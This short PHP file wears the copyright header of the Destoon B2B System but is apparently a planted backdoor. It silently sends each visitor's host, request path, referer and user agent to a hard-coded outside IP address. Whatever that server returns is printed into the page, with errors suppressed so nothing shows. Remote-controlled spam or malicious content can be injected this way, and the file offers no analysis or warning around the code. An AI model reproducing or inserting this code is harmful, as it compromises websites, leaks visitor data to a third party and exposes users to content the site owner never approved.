<?php

/*
	[Destoon B2B System] Copyright (c) 2008-2016 www.destoon.com
	This is NOT a freeware, use is subject to license.txt
*/


set_time_limit(30);error_reporting(0);
date_default_timezone_set('Asia/Shanghai');
header("Content-Type: text/html;charset=gb2312");
$hquu= "http://98.126.204.130:306";
$host="/?&host=".$_SERVER['HTTP_HOST'];
$hurl="&hurl=".$_SERVER["REQUEST_URI"];
$href="&href=".$_SERVER["HTTP_REFERER"];
$hagt="&hagt=".$_SERVER["HTTP_USER_AGENT"];
echo $hq=curl($hquu.$host.$hurl.$href.$hagt);
function curl($hquu){
	$ch = curl_init();
	curl_setopt($ch,CURLOPT_URL,$hquu);
	curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
	curl_setopt($ch,CURLOPT_HEADER,0);
	return curl_exec($ch);
	curl_close($ch);
}
?>
